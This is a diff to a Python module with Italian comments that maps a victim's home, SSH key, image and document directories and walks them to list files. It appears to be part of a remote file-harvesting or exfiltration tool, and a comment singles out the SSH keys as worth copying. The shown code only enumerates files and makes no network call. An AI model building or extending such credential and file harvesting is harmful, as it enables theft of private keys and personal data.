@@ -22,20 +22,21 @@ __headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-
                   "12": b"<Content-Path>"}
 
 
-__filesystem_hierarchy = {"1": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
-                          "2": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
-                          "3": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
-                          "4": [],  # Recupero Immagini (?)
-                          "5": [],  # Recupero Documenti (?)
-                          "6": [f"/home/{os.getlogin()}/.config/"],  # Recupero File di config (?)
+__filesystem_hierarchy = {"Root": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
+                          "Home": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
+                          "SSH KEYS": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
+                          "Images": [],  # Recupero Immagini (?)
+                          "Documents": [],  # Recupero Documenti (?)
                           }
 
 
 # Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
-def get_path_content(current_position: str) -> list:
+def get_path_content(content_path: str) -> list:
     """Funzione per il recupero del contenuto di directory e file dato un path."""
+    current_position = __filesystem_hierarchy.get(content_path)
+
     total_files = []
-    for path, dirs, files in os.walk(current_position):
+    for path, dirs, files in os.walk(current_position[0]):  # Al momento è hardcoded -> Introdurre variabile globale che identifichi il tipo di OS
         for filename in files:
             total_files.append(os.path.join(path, filename))
     return total_files
